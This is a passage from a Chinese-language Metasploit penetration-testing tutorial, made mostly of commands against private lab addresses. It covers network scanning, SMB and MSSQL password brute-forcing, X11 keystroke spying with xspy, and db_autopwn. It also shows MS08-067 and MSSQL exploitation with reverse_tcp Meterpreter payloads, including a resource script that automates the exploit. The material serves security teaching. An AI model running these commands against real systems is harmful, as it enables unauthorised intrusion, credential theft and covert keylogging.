<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/mssql/mssql_ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 255</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>SSH服务器扫描：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ssh/ssh_version </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>FTP主机扫描：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ftp/ftp_version </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 255</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>扫描FTP匿名登录：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use auxiliary/scanner/ftp/anonymos</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>扫描SNMP主机：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/snmp/snmp_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="6编写自定义扫描模块">6、编写自定义扫描模块：<a href="#6编写自定义扫描模块" class="hash-link" aria-label="6、编写自定义扫描模块：的直接链接" title="6、编写自定义扫描模块：的直接链接">​</a></h3>
<p>MSF框架提供对其所有exploit和method的访问，支持代理，SSL，报告生成，线程， 使用Ruby语言。</p>
<p>例子：一个简单的自定义扫描模块</p>
<div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#Metasploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">require ‘msf/core’</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class Metasploit3 &lt; Msf::Auxiliary</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf::Exploit::Remote::Tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf:Auxiliary::Scanner</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def initialize</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">super(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Name’ =&gt; ‘My custom TCP scan’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Version’ =&gt; ‘$Revision: 1$’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Description’ =&gt; ‘My quick scanner’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Author’ =&gt; ‘Your name here’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘License’ =&gt; ‘MSF_LICENSE’</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">register_options(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Opt::RPORT(12345)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ],self.class)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def run_host(ip)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    connect()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sock.puts(‘HELLO SERVER’)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data = sock.recv(1024)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        print_status(“Received: #{data} from #{ip}”)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        disconnect()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span></code></pre></div></div>
<p>测试：将模块保存到modules/auxiliary/scanner/目录下面,命名为simple_tcp.rb，注意保存的位置很重要。</p>
<p>使用nc监听一个端口测试这个模块：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo “Hello Metasploit” &gt; banner.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nc –lvnp 12345 &lt; banner.txt</span><br></span></code></pre></div></div>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/simple_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Received: Hello Metasploit from 192.168.1.111</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="四基本漏洞扫描">四．基本漏洞扫描<a href="#四基本漏洞扫描" class="hash-link" aria-label="四．基本漏洞扫描的直接链接" title="四．基本漏洞扫描的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1-基本扫描">1 基本扫描<a href="#1-基本扫描" class="hash-link" aria-label="1 基本扫描的直接链接" title="1 基本扫描的直接链接">​</a></h3>
<p>1、使用nc与目标端口通信，获取目标端口的信息：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc 192.168.1.111 80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GET HTTP 1/1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Server: Microsoft-IIS/5.1</span><br></span></code></pre></div></div>
<p>1: 还有一个功能与nc类似的工具Ncat，产自nmap社区，可实现相同功能：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ncat -C 192.168.1.111 80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GET / HTTP/1.0</span><br></span></code></pre></div></div>
<p>2：题外：ncat还可以做聊天服务器呢！在服务器端监听然后多个客户端直接连上就可以聊天了：服务器（chatserver）：ncatncat -l --chat   其他客户端：ncat chatserver</p>
<p>3：ncat还可以用来查看各种客户端的请求信息，比如论坛里有人问中国菜刀有木有后门，那么可以这样查看中国菜刀连接后门时发送的数据：
服务器（server.example.com）上：<code>ncat -l --keep-open 80 --output caidao.log &gt; /dev/null</code>  然后使用菜刀连接<a href="http://server.example.com/nc.php" target="_blank" rel="noopener noreferrer">http://server.example.com/nc.php</a> 并请求操作，这是菜刀发送的数据就保存到服务器的caidao.log里面了。也可以导出为hex格式，--output换为--hex-dump就可以了。</p>
<p>4：其实与nc功能类似的工具在bt5里面还有很多，比如还有一个sbd：</p>
<p>监听：<code>sbd -l -p 12345</code></p>
<p>连接：<code>sbd 192.168.1.111 12345</code></p>
<p>5：当然也可以用来聊天，与ncat的不同之处在于ncat自动对用户编号user1、user2、...，而sbd可以自定义昵称，且不需要专门单独监听为聊天服务器：</p>
<p>pc1：<code>sbd -l -p 12345 -P chowner</code></p>
<p>pc2：<code>sbd pc1 12345 -P evil</code></p>
<p>6：其实nc也可以用来聊天的：</p>
<p>pc1：<code>nc -l -p 12345</code></p>
<p>pc2: <code>telnet pc1 12345</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2-与nexpose结合扫描">2 与NeXpose结合扫描：<a href="#2-与nexpose结合扫描" class="hash-link" aria-label="2 与NeXpose结合扫描：的直接链接" title="2 与NeXpose结合扫描：的直接链接">​</a></h3>
<p>在nexpose中扫描目标并生成xml格式的报告后，将报告导入到msf：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_import /tmp/host_test.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,svvs,vulns</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_vulns</span><br></span></code></pre></div></div>
<p>在MSF中运行nexpose：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_destroy postgres:toor@127.0.0.l1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">load nexpose</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nexpose_connect –h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nexpose_connect nexpose:toor@192.168.1.111 ok</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nexpose_scan 192.168.1.195</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_vulns</span><br></span></code></pre></div></div>
<p>（如果你想在bt5里安装nexpose的话建议把bt5硬盘空间多留几十G，这玩意硬盘小了不让装。）</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3与nessus结合扫描">3、与nessus结合扫描：<a href="#3与nessus结合扫描" class="hash-link" aria-label="3、与nessus结合扫描：的直接链接" title="3、与nessus结合扫描：的直接链接">​</a></h3>
<p>使用Nessus扫描完成后生成.nessus格式的报告，导入到MSF：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_import /tmp/nessus_report_Host_test.nessus</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,svcs,vulns</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_vulns</span><br></span></code></pre></div></div>
<p>在MSF中使用Nessus：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">load nessus</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_connect nessus:toor@192.168.1.111:8834 ok</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_policy_list  #查看存在的扫描规则</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_scan_new 2 bridge_scan 192.168.1.111 #2表示规则的ID号，bridge_scan自定义扫描名称</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_scan_status #查看扫描进行状态</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_report_list  #查看扫描结果</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_report_get skjla243-3b5d-*******   #导入报告</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,svcs,vulns</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4特殊扫描">4、特殊扫描：<a href="#4特殊扫描" class="hash-link" aria-label="4、特殊扫描：的直接链接" title="4、特殊扫描：的直接链接">​</a></h3>
<p>SMB弱口令:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/smb/smb_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111-222</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SMBUser Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SMBPass admin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>VNC空口令：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/vnc/vnc_none_auth</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>Open X11空口令：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/x11/open_x11</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>当扫描到此漏洞的主机后可以使用xspy工具来监视对方的键盘输入：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /pentest/sniffers/xspy/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./xspy –display 192.168.1.125:0 –delay 100</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="5使用autopwn处理扫描结果">5、使用Autopwn处理扫描结果：<a href="#5使用autopwn处理扫描结果" class="hash-link" aria-label="5、使用Autopwn处理扫描结果：的直接链接" title="5、使用Autopwn处理扫描结果：的直接链接">​</a></h3>
<p>autopwn选项：e执行attack   t查看匹配模块   r使用reverse shell作为payload   x基于漏洞筛选模块  p基于端口筛选模块</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_import /root/nessus.nbe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_autopwn –e –t –r –x –p</span><br></span></code></pre></div></div>
<ul>
<li>-e 针对符合条件的目标加载所有exploit -t显示所有匹配的exploit -r使用反弹shell</li>
<li>-x 基于漏洞筛选模块 -p基于端口筛选模块</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="五基础溢出命令">五．基础溢出命令<a href="#五基础溢出命令" class="hash-link" aria-label="五．基础溢出命令的直接链接" title="五．基础溢出命令的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1基本命令">1、基本命令：<a href="#1基本命令" class="hash-link" aria-label="1、基本命令：的直接链接" title="1、基本命令：的直接链接">​</a></h3>
<p>查看可用溢出模块<code>show exploits</code>
查看辅助模块<code>show auxiliary</code>  包括扫描器，拒绝服务模块，fuzzer工具或其他。
查看可用选项<code>show options</code></p>
<p>加载模块后退出此模块 back</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">back</span><br></span></code></pre></div></div>
<p>搜索模块 search</p>
<p>例子： <code>searh mssql search ms08_067</code></p>
<p>查看当前模块可用的payload： <code>show payloads</code></p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show payloads</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/shell/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span></code></pre></div></div>
<p>查看可选的目标类型<code>show targets</code>
查看更多信息<code>info</code>
设置一个选项或取消设置 <code>set/unset</code>
设置或取消全局选项 <code>setg/unsetg</code>  例如设置LHOST就可以用setg，避免后面重复设置
保存全局选项的设置 <code>save</code>   当下次启动仍然生效
查看建立的session  <code>sessions –l</code></p>
<p>激活session   <code>sessions –i  num</code>    #num为session编号</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2暴力端口探测">2、暴力端口探测：<a href="#2暴力端口探测" class="hash-link" aria-label="2、暴力端口探测：的直接链接" title="2、暴力端口探测：的直接链接">​</a></h3>
<p>当主机端口对外开放但是普通探测方法无法探测到时，用此模块，msf将对目标的所有端口进行尝试，直到找到一个开放端口并与测试者建立连接。</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use exploit/windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.122</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set TARGET 39 #Windows XP SP3 Chinese - Simplified (NX)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">search ports   #搜索与ports相关模块</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/meterpreter/reverse_tcp_allports</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –j   #作为后台任务运行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –l –v</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sesssions –i 1</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3msf脚本文件">3、MSF脚本文件：<a href="#3msf脚本文件" class="hash-link" aria-label="3、MSF脚本文件：的直接链接" title="3、MSF脚本文件：的直接链接">​</a></h3>
<p>为了缩短测试时间可以将msf命令写入一个文 件，然后在msf中加载它。</p>
<p>加载方式：msfconsole的resource命令或者msfconsole加上-r选项</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo ‘version’ &gt; resource.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo ‘load sounds’ &gt;&gt; resource.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole –r resource.rc</span><br></span></code></pre></div></div>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;use exploit/windows/smb/ms08_067_netapi&#x27; &gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;set RHOST 192.168.1.133&#x27; &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;set PAYLOAD windows/meterpreter/reverse_tcp&#x27; &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;set LHOST 192.168.1.111&#x27; &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;exploit&#x27; &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; resource autoexp.rc</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="六meterpreter">六．METERPRETER<a href="#六meterpreter" class="hash-link" aria-label="六．METERPRETER的直接链接" title="六．METERPRETER的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1使用meterpreter">1、使用meterpreter<a href="#1使用meterpreter" class="hash-link" aria-label="1、使用meterpreter的直接链接" title="1、使用meterpreter的直接链接">​</a></h3>
<p>当对目标系统进行溢出时，使用meterpreter作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。
例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; nmap –sT –A –P0 192.168.1.130 #探测开放服务</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#假如已经探测到1433（TCP）和1434(UDP)端口（mssql），</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; nmap –sU 192.168.1.130 –P 1434   #确认端口开放</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/mssql/mssql_ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.1/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 20</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<p>至此可获取服务器名称，版本号等信息。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/mssql/mssql_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set verbose false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<p>暴力猜解登陆密码。接下来使用mssql自带的xp_cmdshell功能添加账户：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use exploit/windows/mssql/mssql_payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 433</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PASSWORD password130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<p>当获取到一个meterpreter shell 后可以执行更多的操作：</p>
